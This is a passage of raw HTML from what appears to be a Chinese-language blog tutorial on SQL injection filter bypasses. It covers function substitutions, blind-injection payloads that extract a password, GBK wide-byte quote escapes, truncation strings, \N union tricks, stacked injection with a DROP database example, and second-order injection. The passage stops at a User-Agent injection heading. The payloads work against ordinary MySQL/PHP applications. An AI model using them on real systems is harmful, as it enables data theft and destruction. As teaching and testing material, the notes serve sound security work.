</span></span><span class="line"><span class="cl">sleep()==&gt;benchmark()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">concat_ws()==&gt;group_concat()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mid()、substr()==&gt;substring() @@user==&gt;user() @@datadir==&gt;datadir()</span></span></code></pre></td></tr></table>
</div>
</div><p>例如：<code>substring()</code>和<code>substr()</code>无法使用时</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">substr((select&#39;password&#39;),1,1)=0x70strcmp(left(&#39;password&#39;,1),0x69)=1strcmp(left(&#39;password&#39;,1),0x70)=0strcmp(left(&#39;password&#39;,1),0x71)=-1</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="宽字节注入" class="heading-element"><span>宽字节注入</span>
 <a href="#%e5%ae%bd%e5%ad%97%e8%8a%82%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><blockquote>
<p>过滤单引号</p>
</blockquote>
<p>过滤 <code>'</code> 的时候往往利用的思路是将 &rsquo; 转换为 <code>\'</code></p>
<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，所以会没有被反斜杠</p>
<ul>
<li>
<p>%df 吃掉 \ 具体的方法是 urlencode(&rsquo;) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&rsquo;）符号在外面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id=-1%df%27union select 1,user(),3--+</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>将 ' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉</p>
</li>
<li>
<p>一般产生宽字节注入的PHP函数</p>
<ul>
<li>replace（）：过滤 &rsquo; \ ，将 &rsquo; 转化为 ' ，将 \ 转为 \，将 &quot; 转为 &quot; 。用方案1</li>
<li>addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&rsquo; , &quot; , \ 。用方案1。（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</li>
<li>mysql_real_escape_string()：转义下列字符：\x00 \n \r '&quot; \x1a</li>
</ul>
</li>
</ul>
<h2 id="截断绕过" class="heading-element"><span>截断绕过</span>
 <a href="#%e6%88%aa%e6%96%ad%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>%00,%0A,?,/0,&hellip;&hellip;..,%80-%99</li>
<li>目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。</li>
<li>././././././././././././././././abc</li>
<li>..1/abc/../1/abc/../1/abc</li>
</ul>
<h2 id="n绕过" class="heading-element"><span>\N绕过</span>
 <a href="#n%e7%bb%95%e8%bf%87" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>\N其实相当于NULL字符</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from users where id=8E0 union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0 union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\Nunion select1,2,3,4,5,6,7,8,9,0</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h2 id="堆叠注入" class="heading-element"><span>堆叠注入</span>
 <a href="#%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p>在SQL中，分号<code>;</code>是用来表示一条sql语句的结束，因此由这个衍生出来几个句子用<code>;</code>连接来进行多个句子执行。</p>
<p>union injection（union注入）也是将两条语句合并在一起，两者之间有什么区别呢？</p>
<p>区别：</p>
<p>union 或者union all执行的语句类型<strong>是有限的</strong>，只可以用来执行查询语句</p>
<p>堆叠注入可以执行的是<strong>任意的语句</strong>。</p>
<p>例如：</p>
<p>用户输入：<code>root';DROP database user；</code></p>
<p>服务器端生成的sql语句为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from user where name=&#39;root&#39;;
</span></span><span class="line"><span class="cl">DROP database user;</span></span></code></pre></td></tr></table>
</div>
</div><p>当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。</p>
<h2 id="二次注入" class="heading-element"><span>二次注入</span>
 <a href="#%e4%ba%8c%e6%ac%a1%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h3 id="过程" class="heading-element"><span>过程</span>
 <a href="#%e8%bf%87%e7%a8%8b" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><ol>
<li>插入1‘#</li>
<li>转义成1\’#</li>
<li>不能注入，但是保存在数据库时变成了原来的1’#</li>
<li>利用1’#进行注入,这里利用时要求取出数据时不转义</li>
</ol>
<h3 id="条件" class="heading-element"><span>条件</span>
 <a href="#%e6%9d%a1%e4%bb%b6" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><ol>
<li>用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</li>
<li>数据库对自己存储得数据非常放心，直接读取出恶意数据给用户</li>
</ol>
<h3 id="利用" class="heading-element"><span>利用</span>
 <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><p>比如注册某个</p>
<h2 id="user-agent-注入" class="heading-element"><span>User-Agent 注入</span>
 <a href="#user-agent-%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2>
